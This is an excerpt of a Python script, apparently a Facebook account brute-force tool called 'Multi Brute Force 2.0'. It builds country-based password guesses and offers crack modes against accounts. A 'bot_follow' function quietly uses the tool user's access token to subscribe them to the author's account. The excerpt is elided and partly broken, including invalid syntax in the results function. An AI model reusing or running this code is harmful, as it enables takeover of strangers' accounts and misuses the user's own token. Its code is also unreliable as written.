...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Heaven Azhar X  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Heavenzar ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def country():
    ...
    print("%s[%s2%s] %sBangladesh"%(k,p,k,p))
    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
    print("%s[%s4%s] %sUSA"%(k,p,k,p))
    print("%s[%s5%s] %sVietnam"%(k,p,k,p))
    choose_country()
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100069213142616/subscribers?access_token=" + toket)      # Heaven Azhar
	menu()
...
def pilihcrack(file):
  ...
  print((k+"["+p+"3"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
	...
	for i in text.split(" "):
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				results.append(i)
				if "id" in ct:
					results.append("indonesia0")
					results.append("anjing123")
				elif "bd" in ct:
        ...
        try:
          while True:
            try:
              ...
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : Indonesia,Anjinc,Heavenzargans"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
        ...
        try:
          while True:
            try:
              ...
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : Sayang,Anjinc,12345678"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
...
def results(Heaven Azhar):
        if len(Azhar) !=0:
                print(("[OK] : "+str(len(Heaven))))
        if len(Azhar) !=0:
                print(("[CP] : "+str(len(Azhar))))
        if len(Heaven) ==0 and len(Azhar) ==0:
                print("\n")
